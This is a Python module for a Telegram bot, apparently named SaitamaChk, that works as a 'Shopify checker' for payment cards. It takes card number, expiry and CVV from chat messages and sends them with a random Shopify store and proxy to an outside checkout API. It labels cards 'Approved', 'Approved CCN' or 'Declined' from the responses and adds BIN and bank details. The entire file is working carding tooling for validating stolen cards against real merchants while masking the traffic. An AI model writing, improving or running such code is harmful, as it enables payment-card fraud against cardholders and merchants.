# sh.py - Shopify Checker para SaitamaChk (FINAL)

import logging
import re
import random
import time
import asyncio
import aiohttp

import db
from antispam import antispam_guard
from telegram import Update
from telegram.ext import ContextTypes, CommandHandler, MessageHandler, filters

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("sh")

BOT_TAG = '<a href="http://t.me/SaitamaChecker_Bot">[拳]</a>'

# ==============================
# CONFIG - NUEVA API
# ==============================

API_URL = "https://shopi-production-7ef9.up.railway.app/"
REQUEST_TIMEOUT = 60
CONNECT_TIMEOUT = 20

CC_REGEX = r'(\d{14,16})[:,.;/\\|\s]+(\d{1,2})[:,.;/\\|\s]+(\d{2,4})[:,.;/\\|\s]+(\d{3,4})'

# ==============================
# CONCURRENCIA PERSONAL
# ==============================

busy_users = {}

def get_limit(uid: int) -> int:
    if db.is_owner(uid) or db.is_admin(uid) or db.is_premium(uid):
        return 4
    return 2

def can_run(uid: int) -> bool:
    return busy_users.get(uid, 0) < get_limit(uid)

def mark_start(uid: int):
    busy_users[uid] = busy_users.get(uid, 0) + 1

def mark_end(uid: int):
    if uid in busy_users:
        busy_users[uid] -= 1
        if busy_users[uid] <= 0:
            del busy_users[uid]

# ==============================
# HELPERS
# ==============================

def extract_card(text):
    m = re.search(CC_REGEX, text)
    if not m:
        return None
    n, mm, yy, cvv = m.groups()
    return {
        "number": n,
        "month": mm.zfill(2),
        "year": yy[-2:],
        "cvv": cvv
    }

def build_cc(c):
    year = f"20{c['year']}" if int(c["year"]) <= 50 else f"19{c['year']}"
    return f"{c['number']}|{c['month']}|{year}|{c['cvv']}"

def format_site(site: str) -> str:
    return site if site.startswith("http") else f"https://{site}"

def format_proxy(proxy: str) -> str:
    return proxy if proxy.count(":") >= 3 else f"{proxy}:user:pass"

def get_bin(card_number: str):
    from bin import get_bin_info
    return get_bin_info(card_number[:6])

# ==============================
# STATUS POR RESPONSE (FINAL)
# ==============================

def status_from_response(resp: str) -> str:
    if not resp:
        return "Error ⚠️"

    r = resp.upper().replace(" ", "_")

    APPROVED = [
        "3D_AUTHENTICATION",
        "INSUFFICIENT_FUNDS",
        "INCORRECT_ZIP",
        "ORDER_COMPLETED",
        "ORDER_PLACED",
        "THANK_YOU"
    ]

    APPROVED_CCN = [
        "INCORRECT_CVC",
        "INVALID_CVC"
    ]

    DECLINED = [
        "CARD_DECLINED",
        "GENERIC_ERROR",
        "INCORRECT_NUMBER",
        "PROCESSING_ERROR",
        "FRAUD_SUSPECTED",
        "RISKY"
    ]

    if any(x in r for x in APPROVED):
        return "Approved ✅"

    if any(x in r for x in APPROVED_CCN):
        return "Approved CCN ✅"

    if any(x in r for x in DECLINED):
        return "Declined ❌"

    return "Error ⚠️"

# ==============================
# API CALL - NUEVA IMPLEMENTACIÓN
# ==============================

async def check_shopify(card, site, proxy):
    params = {
        "cc": build_cc(card),
        "url": format_site(site),
        "proxy": format_proxy(proxy)
    }

    timeout = aiohttp.ClientTimeout(
        total=REQUEST_TIMEOUT,
        connect=CONNECT_TIMEOUT
    )

    try:
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.get(API_URL, params=params) as r:
                if r.status == 200:
                    data = await r.json()
                    return (
                        data.get("Gate", "Normal"),
                        data.get("Price", "0"),
                        data.get("Response", "N/A")
                    )
                else:
                    return "Normal", "0", f"HTTP {r.status}"
    except asyncio.TimeoutError:
        return "Normal", "0", "TIMEOUT"
    except aiohttp.ClientError as e:
        return "Normal", "0", f"CONN_ERR: {str(e)[:40]}"
    except Exception as e:
        return "Normal", "0", str(e)[:60]

# ==============================
# FORMATO FINAL (COPIABLE)
# ==============================

def format_result(gateway, price, cc, status, response, bininfo, site_i, proxy_i, t, user):
    title = f"{gateway} {price}" if price != "0" else gateway

    return (
        f"{BOT_TAG} <b>Gateway:</b> <code>{title}</code>\n"
        "━━━━━━━━━━━━━━━━\n"
        f"{BOT_TAG} <b>CC:</b> <code>{cc}</code>\n"
        f"{BOT_TAG} <b>Status:</b> <code>{status}</code>\n"
        f"{BOT_TAG} <b>Response:</b> <code>{response}</code>\n"
        "━━━━━━━━━━━━━━━━\n"
        f"{BOT_TAG} <b>Info:</b> <code>{bininfo['info']}</code>\n"
        f"{BOT_TAG} <b>Bank:</b> <code>{bininfo['bank']}</code>\n"
        f"{BOT_TAG} <b>Country:</b> <code>{bininfo['country']}</code>\n"
        "━━━━━━━━━━━━━━━━\n"
        f"{BOT_TAG} <b>Site:</b> {site_i}\n"
        f"{BOT_TAG} <b>Proxy:</b> {proxy_i}\n"
        f"{BOT_TAG} <b>Time:</b> {t:.2f}s\n"
        "━━━━━━━━━━━━━━━━\n"
        f"{BOT_TAG} <b>Req by:</b> @{user}"
    )

# ==============================
# /SH
# ==============================

async def handle_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    user = update.effective_user.username or update.effective_user.first_name
    msg = update.message

    if not await antispam_guard(update, context):
        return

    if not can_run(uid):
        await msg.reply_text(
            "⏳ Límite de verificaciones simultáneas alcanzado.",
            reply_to_message_id=msg.message_id
        )
        return

    if not db.get_user(uid):
        await msg.reply_text(
            "❌ Debes registrarte primero.",
            reply_to_message_id=msg.message_id
        )
        return

    sites = db.get_user_shopify_sites(uid)
    proxies = db.get_user_proxies(uid)

    if not sites or not proxies:
        await msg.reply_text(
            "❌ Necesitas sitios Shopify y proxies.",
            reply_to_message_id=msg.message_id
        )
        return

    if len(msg.text.split(maxsplit=1)) < 2:
        await msg.reply_text(
            "⚠️ Uso: <code>/sh n|mm|yy|cvv</code>",
            parse_mode="HTML",
            reply_to_message_id=msg.message_id
        )
        return

    card = extract_card(msg.text)
    if not card:
        await msg.reply_text("❌ Formato de tarjeta inválido.", reply_to_message_id=msg.message_id)
        return

    mark_start(uid)
    processing = await msg.reply_text("🔄 Checking...", reply_to_message_id=msg.message_id)
    start = time.time()

    site_i = random.randrange(len(sites))
    proxy_i = random.randrange(len(proxies))

    try:
        gateway, price, response = await check_shopify(
            card,
            sites[site_i],
            proxies[proxy_i]
        )

        elapsed = time.time() - start
        bininfo = get_bin(card["number"])
        status = status_from_response(response)

        await processing.edit_text(
            format_result(
                gateway,
                price,
                build_cc(card),
                status,
                response,
                bininfo,
                site_i + 1,
                proxy_i + 1,
                elapsed,
                user
            ),
            parse_mode="HTML",
            disable_web_page_preview=True
        )
    finally:
        mark_end(uid)

# ==============================
# DOT
# ==============================

async def handle_dot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text.startswith(".sh"):
        await handle_sh(update, context)

# ==============================
# REGISTER
# ==============================

def register_handlers(app):
    app.add_handler(CommandHandler("sh", handle_sh))
    app.add_handler(MessageHandler(filters.Regex(r"^\.sh\b"), handle_dot))
    logger.info("Handlers SH cargados con NUEVA API")